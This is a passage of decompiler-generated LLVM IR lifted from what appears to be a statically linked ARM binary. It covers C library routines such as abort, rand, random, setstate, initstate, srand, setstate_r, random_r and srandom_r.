  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_2c800.988, align 4
  %v2_15f0c = bitcast i32* %stack_var_-268 to i8*
  %v3_15f0c = call i32 @__GI_memset(i8* %v2_15f0c, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15f20

dec_label_pc_15f20:                               ; preds = %dec_label_pc_15f20.lr.ph, %dec_label_pc_15f20
  %v1_15f24 = phi i32 [ 31, %dec_label_pc_15f20.lr.ph ], [ %v1_15f30, %dec_label_pc_15f20 ]
  %v4_15f24 = mul i32 %v1_15f24, 4
  %v5_15f24 = add i32 %v4_15f24, %v2_15e6c
  %v2_15f2c = add i32 %v5_15f24, -264
  %v3_15f2c = inttoptr i32 %v2_15f2c to i32*
  store i32 -1, i32* %v3_15f2c, align 4
  %v0_15f30 = load i32, i32* %r1.global-to-local, align 4
  %v1_15f30 = add i32 %v0_15f30, -1
  store i32 %v1_15f30, i32* %r1.global-to-local, align 4
  %v6_15f30 = icmp slt i32 %v1_15f30, 0
  br i1 %v6_15f30, label %dec_label_pc_15f38, label %dec_label_pc_15f20

dec_label_pc_15f38:                               ; preds = %dec_label_pc_15f20
  store i32 %v2_15e50, i32* %r1.global-to-local, align 4
  %v4_15f4c = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_15ec0

dec_label_pc_15f54:                               ; preds = %dec_label_pc_15ee8
  %v7_15f54 = icmp eq i32 %v0_15f5c, 2
  br i1 %v7_15f54, label %dec_label_pc_15f5c, label %dec_label_pc_15f68

dec_label_pc_15f5c:                               ; preds = %dec_label_pc_15f54
  store i32 3, i32* @global_var_2c800.988, align 4
  %v0_15f64 = call i32 @abort()
  %v2_15f68.pre = load i32, i32* @global_var_2c800.988, align 4
  br label %dec_label_pc_15f68

dec_label_pc_15f68:                               ; preds = %dec_label_pc_15f54, %dec_label_pc_15f5c
  %v1_15f70 = phi i32 [ %v0_15f5c, %dec_label_pc_15f54 ], [ %v2_15f68.pre, %dec_label_pc_15f5c ]
  %v7_15f6c = icmp eq i32 %v1_15f70, 3
  br i1 %v7_15f6c, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_15f68
  %v2_15f78 = load i32, i32* %ip.global-to-local, align 4
  %v3_15f78 = inttoptr i32 %v2_15f78 to i32*
  store i32 4, i32* %v3_15f78, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15f68, %bb27
  call void @__pseudo_cond_branch(i1 %v7_15f6c, i32 ptrtoint (i32* @global_var_128b4.990 to i32))
  br label %dec_label_pc_15f80

dec_label_pc_15f80:                               ; preds = %dec_label_pc_15f80, %.thread3
  %v0_15f80 = call i32 @abort()
  br label %dec_label_pc_15f80

; uselistorder directives
  uselistorder i32 %v1_15f30, { 2, 1, 0 }
  uselistorder i32 %v1_15e7c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 8, 3, 0, 1, 4, 5, 7, 6, 2 }
  uselistorder i32 140, { 1, 0 }
  uselistorder i32* @global_var_2c800.988, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15f68, { 1, 0 }
  uselistorder label %dec_label_pc_15f20, { 1, 0 }
  uselistorder label %dec_label_pc_15ee8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_15e6c, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_15f98 = call i32 @random()
  ret i32 %v0_15f98

; uselistorder directives
  uselistorder i32 ()* @random, { 9, 8, 5, 4, 3, 2, 1, 7, 6, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_15f9c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_264b8.992 to i32), i32* @r4, align 4
  %v2_15fa4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_15fa4, i32* @r0, align 4
  %v1_15fbc = call i32 @__pthread_return_void()
  %v1_15fcc = call i32 @__pthread_return_0()
  %v2_15fd0 = ptrtoint i32* %stack_var_-16 to i32
  %v3_15fd8 = call i32 @__GI_random_r(i32* inttoptr (i32 156880 to i32*), i32 %v2_15fd0)
  store i32 %v2_15fa4, i32* @r0, align 4
  store i32 90096, i32* @lr, align 4
  %v1_15fec = call i32 @__pthread_return_void()
  %v3_15ff0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_15f9c, i32* @r4, align 4
  ret i32 %v3_15ff0
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_1601c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1601c, i32* @r0, align 4
  %v1_16038 = call i32 @__pthread_return_void()
  %v1_16048 = call i32 @__pthread_return_0()
  %v3_16058 = load i32, i32* bitcast (i32** @global_var_264d8.1005 to i32*), align 4
  store i32 %v3_16058, i32* @r4, align 4
  %v3_1605c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_264d0)
  %v1_16064 = icmp slt i32 %v3_1605c, 0
  store i32 %v2_1601c, i32* @r0, align 4
  %. = select i1 %v1_16064, i32 0, i32 ptrtoint (i32** @global_var_264d4.1007 to i32)
  %v1_1607c = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_160ac = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_160ac, i32* @r0, align 4
  %v1_160d0 = call i32 @__pthread_return_void()
  %v1_160e0 = call i32 @__pthread_return_0()
  %v0_160e8 = load i32, i32* @r5, align 4
  %v0_160ec = load i32, i32* @r6, align 4
  %v0_160f0 = load i32, i32* @r8, align 4
  store i32 %v0_160f0, i32* @r0, align 4
  %v3_160f4 = load i32, i32* bitcast (i32** @global_var_264d8.1005 to i32*), align 4
  store i32 %v3_160f4, i32* @r4, align 4
  %v4_160f8 = inttoptr i32 %v0_160f0 to i32*
  %v5_160f8 = call i32 @__GI_initstate_r(i32* %v4_160f8, i32 %v0_160e8, i32 %v0_160ec, i32 ptrtoint (i32* @global_var_264d0 to i32))
  store i32 %v2_160ac, i32* @r0, align 4
  %v1_1610c = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_264d4.1007 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_1613c = load i32, i32* @r4, align 4
  %v9_1613c = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_264b8.992 to i32), i32* @r4, align 4
  %v2_16144 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_16144, i32* @r0, align 4
  %v1_16160 = call i32 @__pthread_return_void()
  %v1_16170 = call i32 @__pthread_return_0()
  %v0_16174 = load i32, i32* @r6, align 4
  store i32 %v0_16174, i32* @r0, align 4
  %v2_1617c = inttoptr i32 %v0_16174 to i32*
  %v3_1617c = call i32 @srandom_r(i32* %v2_1617c, i32 ptrtoint (i32* @global_var_264d0 to i32))
  store i32 %v2_16144, i32* @r0, align 4
  store i32 90520, i32* @lr, align 4
  %v1_16194 = call i32 @__pthread_return_void()
  store i32 %v3_1613c, i32* @r4, align 4
  store i32 %v9_1613c, i32* @r6, align 4
  ret i32 %v1_16194

; uselistorder directives
  uselistorder i32* @global_var_264d0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_264d0 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_161b8 = add i32 %tmp, 12
  %v2_161b8 = inttoptr i32 %v1_161b8 to i32*
  %v3_161b8 = load i32, i32* %v2_161b8, align 4
  %v3_161bc = load i32, i32* @r4, align 4
  store i32 %v3_161bc, i32* %stack_var_-20, align 4
  %v2_161c0 = icmp eq i32 %v3_161b8, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_161c0, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_161cc1 = add i32 %tmp, 8
  %v2_161cc2 = inttoptr i32 %v1_161cc1 to i32*
  %v3_161cc3 = load i32, i32* %v2_161cc2, align 4
  store i32 %v3_161cc3, i32* %r1.global-to-local, align 4
  %v3_161e0 = add i32 %v3_161cc3, -4
  %v4_161e0 = inttoptr i32 %v3_161e0 to i32*
  store i32 0, i32* %v4_161e0, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_161c8 = add i32 %tmp, 4
  %v3_161c8 = inttoptr i32 %v2_161c8 to i32*
  %v4_161c8 = load i32, i32* %v3_161c8, align 4
  %v1_161cc = add i32 %tmp, 8
  %v2_161cc = inttoptr i32 %v1_161cc to i32*
  %v3_161cc = load i32, i32* %v2_161cc, align 4
  store i32 %v3_161cc, i32* %r1.global-to-local, align 4
  %v3_161d0 = sub i32 %v4_161c8, %v3_161cc
  %v4_161d4 = sdiv i32 %v3_161d0, 4
  %v4_161dc = mul i32 %v4_161d4, 5
  %v5_161dc = add i32 %v4_161dc, %v3_161b8
  %v3_161e4 = add i32 %v3_161cc, -4
  %v4_161e4 = inttoptr i32 %v3_161e4 to i32*
  store i32 %v5_161dc, i32* %v4_161e4, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_161e8 = add i32 %arg1, 4
  store i32 %v1_161e8, i32* %r6.global-to-local, align 4
  %v2_161ec = inttoptr i32 %arg1 to i32*
  %v3_161ec = load i32, i32* %v2_161ec, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_161f4 = srem i32 %v3_161ec, 5
  store i32 %v2_161f4, i32* %r0.global-to-local, align 4
  %v2_16200 = and i32 %v2_161f4, 1073741824
  %v3_16200 = icmp ne i32 %v2_16200, 0
  %v4_16200 = mul nsw i32 %v2_161f4, 4
  %v2_16204 = icmp ne i32 %v2_161f4, 4
  %v3_16204 = and i1 %v3_16200, %v2_16204
  br i1 %v3_16204, label %dec_label_pc_16260, label %dec_label_pc_16208

dec_label_pc_16208:                               ; preds = %bb
  %v5_16200 = add i32 %v4_16200, ptrtoint (i32* @global_var_1d86c.1021 to i32)
  %v1_16208 = add i32 %v4_16200, add (i32 ptrtoint (i32* @global_var_1d86c.1021 to i32), i32 20)
  %v2_16208 = inttoptr i32 %v1_16208 to i32*
  %v3_16208 = load i32, i32* %v2_16208, align 4
  store i32 %v3_16208, i32* %r5.global-to-local, align 4
  %v6_1620c = inttoptr i32 %v5_16200 to i32*
  %v7_1620c = load i32, i32* %v6_1620c, align 4
  store i32 %v7_1620c, i32* %r7.global-to-local, align 4
  %v2_16210 = icmp eq i32 %v2_161f4, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_16218 = load i32, i32* %r4.global-to-local, align 4
  %v2_16218 = add i32 %v1_16218, 16
  %v3_16218 = inttoptr i32 %v2_16218 to i32*
  store i32 %v3_16208, i32* %v3_16218, align 4
  %v0_1621c = load i32, i32* %r7.global-to-local, align 4
  %v1_1621c = load i32, i32* %r4.global-to-local, align 4
  %v2_1621c = add i32 %v1_1621c, 20
  %v3_1621c = inttoptr i32 %v2_1621c to i32*
  store i32 %v0_1621c, i32* %v3_1621c, align 4
  %v0_16220 = load i32, i32* %r0.global-to-local, align 4
  %v1_16220 = load i32, i32* %r4.global-to-local, align 4
  %v2_16220 = add i32 %v1_16220, 12
  %v3_16220 = inttoptr i32 %v2_16220 to i32*
  store i32 %v0_16220, i32* %v3_16220, align 4
  br i1 %v2_16210, label %dec_label_pc_1624c, label %dec_label_pc_16228

dec_label_pc_16228:                               ; preds = %dec_label_pc_16208
  %v0_16228 = load i32, i32* %r6.global-to-local, align 4
  %v1_16228 = add i32 %v0_16228, -4
  %v2_16228 = inttoptr i32 %v1_16228 to i32*
  %v3_16228 = load i32, i32* %v2_16228, align 4
  %v1_1622c = load i32, i32* %r1.global-to-local, align 4
  %v2_1622c = sdiv i32 %v3_16228, %v1_1622c
  store i32 %v2_1622c, i32* %r0.global-to-local, align 4
  %v4_16230 = mul i32 %v2_1622c, 4
  %v5_16230 = add i32 %v4_16230, %v0_16228
  %v1_16234 = load i32, i32* %r4.global-to-local, align 4
  %v2_16234 = add i32 %v1_16234, 4
  %v3_16234 = inttoptr i32 %v2_16234 to i32*
  store i32 %v5_16230, i32* %v3_16234, align 4
  %v0_16238 = load i32, i32* %r0.global-to-local, align 4
  %v1_16238 = load i32, i32* %r7.global-to-local, align 4
  %v2_16238 = add i32 %v1_16238, %v0_16238
  %v0_1623c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1623c, i32* %r1.global-to-local, align 4
  %v2_16240 = srem i32 %v2_16238, %v0_1623c
  %v0_16244 = load i32, i32* %r6.global-to-local, align 4
  %v4_16244 = mul i32 %v2_16240, 4
  %v5_16244 = add i32 %v0_16244, %v4_16244
  store i32 %v5_16244, i32* %r0.global-to-local, align 4
  %v1_16248 = load i32, i32* %r4.global-to-local, align 4
  %v2_16248 = inttoptr i32 %v1_16248 to i32*
  store i32 %v5_16244, i32* %v2_16248, align 4
  br label %dec_label_pc_1624c

dec_label_pc_1624c:                               ; preds = %dec_label_pc_16208, %dec_label_pc_16228
  %v0_1624c = load i32, i32* %r6.global-to-local, align 4
  %v1_1624c = load i32, i32* %r5.global-to-local, align 4
  %v4_1624c = mul i32 %v1_1624c, 4
  %v5_1624c = add i32 %v4_1624c, %v0_1624c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16254 = load i32, i32* %r4.global-to-local, align 4
  %v2_16254 = add i32 %v1_16254, 24
  %v3_16254 = inttoptr i32 %v2_16254 to i32*
  store i32 %v5_1624c, i32* %v3_16254, align 4
  %v0_16258 = load i32, i32* %r6.global-to-local, align 4
  %v1_16258 = load i32, i32* %r4.global-to-local, align 4
  %v2_16258 = add i32 %v1_16258, 8
  %v3_16258 = inttoptr i32 %v2_16258 to i32*
  store i32 %v0_16258, i32* %v3_16258, align 4
  %v2_1625c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1625c, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_16260:                               ; preds = %bb
  %v0_16260 = call i32 @__errno_location()
  %v2_16268 = inttoptr i32 %v0_16260 to i32*
  store i32 22, i32* %v2_16268, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16270 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16270, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_161f4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 3, 4, 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1624c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_16278 = add i32 %tmp, 12
  %v2_16278 = inttoptr i32 %v1_16278 to i32*
  %v3_16278 = load i32, i32* %v2_16278, align 4
  store i32 %v3_16278, i32* %r3.global-to-local, align 4
  %v2_1627c = icmp eq i32 %v3_16278, 0
  %v3_16280 = load i32, i32* @r4, align 4
  store i32 %v3_16280, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1628c = add i32 %tmp, 8
  %v2_1628c = inttoptr i32 %v1_1628c to i32*
  %v3_1628c = load i32, i32* %v2_1628c, align 4
  store i32 %v3_1628c, i32* %lr.global-to-local, align 4
  br i1 %v2_1627c, label %dec_label_pc_16294, label %dec_label_pc_162b8

dec_label_pc_16294:                               ; preds = %entry
  %v1_16294 = inttoptr i32 %v3_1628c to i32*
  %v2_16294 = load i32, i32* %v1_16294, align 4
  store i32 %v2_16294, i32* %r2.global-to-local, align 4
  %v2_1629c = mul i32 %v2_16294, 1103515245
  %v1_162a4 = add i32 %v2_1629c, 12345
  %tmp10 = bitcast i32 %v1_162a4 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_162a8 = bitcast float %tmp11 to i32
  store i32 %v1_162a8, i32* %r3.global-to-local, align 4
  store i32 %v1_162a8, i32* %v1_16294, align 4
  %v0_162b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_162b0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_162b0, i32* %v2_162b0, align 4
  br label %dec_label_pc_162fc

dec_label_pc_162b8:                               ; preds = %entry
  %v2_162b8 = load i32, i32* %arg1, align 4
  store i32 %v2_162b8, i32* %r2.global-to-local, align 4
  %v1_162bc = add i32 %tmp, 4
  %v2_162bc = inttoptr i32 %v1_162bc to i32*
  %v3_162bc = load i32, i32* %v2_162bc, align 4
  store i32 %v3_162bc, i32* %r0.global-to-local, align 4
  %v1_162c0 = inttoptr i32 %v2_162b8 to i32*
  %v2_162c0 = load i32, i32* %v1_162c0, align 4
  store i32 %v2_162c0, i32* %r3.global-to-local, align 4
  %v1_162c4 = inttoptr i32 %v3_162bc to i32*
  %v2_162c4 = load i32, i32* %v1_162c4, align 4
  %v4_162c4 = add i32 %v3_162bc, 4
  store i32 %v4_162c4, i32* %r0.global-to-local, align 4
  %v2_162c8 = add i32 %v2_162c4, %v2_162c0
  store i32 %v2_162c8, i32* %r3.global-to-local, align 4
  store i32 %v2_162c8, i32* %v1_162c0, align 4
  %v3_162cc = load i32, i32* %r2.global-to-local, align 4
  %v4_162cc = add i32 %v3_162cc, 4
  store i32 %v4_162cc, i32* %r2.global-to-local, align 4
  %v0_162d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_162d0 = add i32 %v0_162d0, 24
  %v2_162d0 = inttoptr i32 %v1_162d0 to i32*
  %v3_162d0 = load i32, i32* %v2_162d0, align 4
  store i32 %v3_162d0, i32* %r4.global-to-local, align 4
  %v0_162d4 = load i32, i32* %r3.global-to-local, align 4
  %v3_162d4 = udiv i32 %v0_162d4, 2
  store i32 %v3_162d4, i32* %r3.global-to-local, align 4
  %v3_162d8 = icmp ult i32 %v4_162cc, %v3_162d0
  %v1_162dc = load i32, i32* %r5.global-to-local, align 4
  %v2_162dc = inttoptr i32 %v1_162dc to i32*
  store i32 %v3_162d4, i32* %v2_162dc, align 4
  br i1 %v3_162d8, label %dec_label_pc_162ec, label %bb

bb:                                               ; preds = %dec_label_pc_162b8
  %v1_162e0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_162e0, i32* %r2.global-to-local, align 4
  %v0_162e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_162e4, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_162ec:                               ; preds = %dec_label_pc_162b8
  %v0_162e41 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_162e41, i32* %r3.global-to-local, align 4
  %v1_162ec = load i32, i32* %r4.global-to-local, align 4
  %v3_162ec = icmp ult i32 %v0_162e41, %v1_162ec
  br i1 %v3_162ec, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_162ec
  store i32 %v0_162e41, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_162ec
  %v1_162f4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_162f4, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_162f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_162f8 = inttoptr i32 %v0_162f8 to i32*
  %v2_162f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_162f8, i32* %v1_162f8, align 4
  %v3_162f8 = add i32 %v0_162f8, 4
  %v4_162f8 = inttoptr i32 %v3_162f8 to i32*
  %v5_162f8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_162f8, i32* %v4_162f8, align 4
  br label %dec_label_pc_162fc

dec_label_pc_162fc:                               ; preds = %dec_label_pc_16294, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_16300 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16300, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_162e41, { 1, 0, 2 }
  uselistorder i32 %v3_162d4, { 1, 0 }
  uselistorder i32 %v1_162a8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_162fc, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16308 = load i32, i32* @r4, align 4
  store i32 %v3_16308, i32* %stack_var_-32, align 4
  %v6_16308 = load i32, i32* @r5, align 4
  %v1_1630c = add i32 %tmp, 12
  %v2_1630c = inttoptr i32 %v1_1630c to i32*
  %v3_1630c = load i32, i32* %v2_1630c, align 4
  %v2_16314 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_1630c, 4
  br i1 %tmp29, label %.dec_label_pc_163c0_crit_edge, label %dec_label_pc_16324

.dec_label_pc_163c0_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_163c0

dec_label_pc_16324:                               ; preds = %entry
  %v0_16324 = load i32, i32* @r0, align 4
  %v2_16324 = icmp eq i32 %v0_16324, 0
  %v1_16328 = add i32 %tmp, 8
  %v2_16328 = inttoptr i32 %v1_16328 to i32*
  %v3_16328 = load i32, i32* %v2_16328, align 4
  store i32 %v3_16328, i32* %r7.global-to-local, align 4
  br i1 %v2_16324, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_16324
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16324, %bb
  %v0_16334 = phi i32 [ %v0_16324, %dec_label_pc_16324 ], [ 1, %bb ]
  %v2_16330 = icmp eq i32 %v3_1630c, 0
  %v2_16334 = inttoptr i32 %v3_16328 to i32*
  store i32 %v0_16334, i32* %v2_16334, align 4
  br i1 %v2_16330, label %dec_label_pc_163bc, label %dec_label_pc_1633c

dec_label_pc_1633c:                               ; preds = %bb21
  %v1_1633c = add i32 %tmp, 16
  %v2_1633c = inttoptr i32 %v1_1633c to i32*
  %v3_1633c = load i32, i32* %v2_1633c, align 4
  store i32 %v3_1633c, i32* %sb.global-to-local, align 4
  %v0_16340 = load i32, i32* @r0, align 4
  %v0_16344 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16344, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_1638c23 = icmp sgt i32 %v3_1633c, 1
  br i1 %v5_1638c23, label %dec_label_pc_16350, label %dec_label_pc_16390

dec_label_pc_16350:                               ; preds = %dec_label_pc_1633c, %dec_label_pc_16350
  %v0_1636025 = phi i32 [ %v0_16380.pre, %dec_label_pc_16350 ], [ %v0_16340, %dec_label_pc_1633c ]
  %v1_1637824 = phi i32 [ %v5_16378, %dec_label_pc_16350 ], [ %v0_16344, %dec_label_pc_1633c ]
  %v2_16350 = srem i32 %v0_1636025, 127773
  %v2_1635c = mul i32 %v2_16350, 16807
  %v2_16364 = sdiv i32 %v0_1636025, 127773
  %tmp30 = mul nsw i32 %v2_16364, -2836
  %v2_16370 = add i32 %v2_1635c, %tmp30
  %v8_16370 = icmp slt i32 %v2_16370, 0
  %v2_16374 = add i32 %v2_16370, 2147483647
  %v2_16374.v2_16370 = select i1 %v8_16370, i32 %v2_16374, i32 %v2_16370
  store i32 %v2_16374.v2_16370, i32* @r5, align 4
  %v2_16378 = add i32 %v1_1637824, 4
  %v3_16378 = inttoptr i32 %v2_16378 to i32*
  store i32 %v2_16374.v2_16370, i32* %v3_16378, align 4
  %v4_16378 = load i32, i32* %sl.global-to-local, align 4
  %v5_16378 = add i32 %v4_16378, 4
  store i32 %v5_16378, i32* %sl.global-to-local, align 4
  %v0_1637c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1637c.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_16380.pre = load i32, i32* @r5, align 4
  %v1_16388 = add i32 %v0_1637c.pre, 1
  store i32 %v1_16388, i32* %r8.global-to-local, align 4
  %v5_1638c = icmp slt i32 %v0_1637c.pre, %v1_1637c.pre
  br i1 %v5_1638c, label %dec_label_pc_16350, label %dec_label_pc_1637c.dec_label_pc_16390_crit_edge

dec_label_pc_1637c.dec_label_pc_16390_crit_edge:  ; preds = %dec_label_pc_16350
  %v0_1639c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16390

dec_label_pc_16390:                               ; preds = %dec_label_pc_1637c.dec_label_pc_16390_crit_edge, %dec_label_pc_1633c
  %v0_1639c = phi i32 [ %v0_1639c.pre, %dec_label_pc_1637c.dec_label_pc_16390_crit_edge ], [ %v0_16344, %dec_label_pc_1633c ]
  %v0_16394.lcssa = phi i32 [ %v1_1637c.pre, %dec_label_pc_1637c.dec_label_pc_16390_crit_edge ], [ %v3_1633c, %dec_label_pc_1633c ]
  %v2_16394 = mul i32 %v0_16394.lcssa, 10
  store i32 %v2_16394, i32* @r4, align 4
  %v0_16398 = load i32, i32* %r6.global-to-local, align 4
  %v1_16398 = add i32 %v0_16398, 20
  %v2_16398 = inttoptr i32 %v1_16398 to i32*
  %v3_16398 = load i32, i32* %v2_16398, align 4
  %v4_1639c = mul i32 %v3_16398, 4
  %v5_1639c = add i32 %v0_1639c, %v4_1639c
  %v1_163a0 = inttoptr i32 %v0_16398 to i32*
  store i32 %v5_1639c, i32* %v1_163a0, align 4
  %v3_163a0 = add i32 %v0_16398, 4
  %v4_163a0 = inttoptr i32 %v3_163a0 to i32*
  %v5_163a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_163a0, i32* %v4_163a0, align 4
  br label %dec_label_pc_163ac

dec_label_pc_163a8:                               ; preds = %dec_label_pc_163ac
  %v0_163b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_163a8 = inttoptr i32 %v0_163b0 to i32*
  %v3_163a8 = call i32 @__GI_random_r(i32* %v2_163a8, i32 %v2_16314)
  br label %dec_label_pc_163ac

dec_label_pc_163ac:                               ; preds = %dec_label_pc_16390, %dec_label_pc_163a8
  %v0_163ac = load i32, i32* @r4, align 4
  %v1_163ac = add i32 %v0_163ac, -1
  store i32 %v1_163ac, i32* @r4, align 4
  %v6_163ac = icmp slt i32 %v1_163ac, 0
  br i1 %v6_163ac, label %dec_label_pc_163bc, label %dec_label_pc_163a8

dec_label_pc_163bc:                               ; preds = %dec_label_pc_163ac, %bb21
  %v2_163c4.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_163c0

dec_label_pc_163c0:                               ; preds = %.dec_label_pc_163c0_crit_edge, %dec_label_pc_163bc
  %v2_163c4 = phi i32 [ %v3_16308, %.dec_label_pc_163c0_crit_edge ], [ %v2_163c4.pre, %dec_label_pc_163bc ]
  %v26_163c4 = phi i32 [ -1, %.dec_label_pc_163c0_crit_edge ], [ 0, %dec_label_pc_163bc ]
  store i32 %v2_163c4, i32* @r4, align 4
  store i32 %v6_16308, i32* @r5, align 4
  ret i32 %v26_163c4

; uselistorder directives
  uselistorder i32 %v1_163ac, { 1, 0 }
  uselistorder i32 %v0_16398, { 1, 0, 2 }
  uselistorder i32 %v0_1637c.pre, { 1, 0 }
  uselistorder i32 %v5_16378, { 1, 0 }
  uselistorder i32 %v2_16370, { 2, 1, 0 }
  uselistorder i32 %v0_1636025, { 1, 0 }
  uselistorder i32 %v0_16344, { 1, 0, 2 }
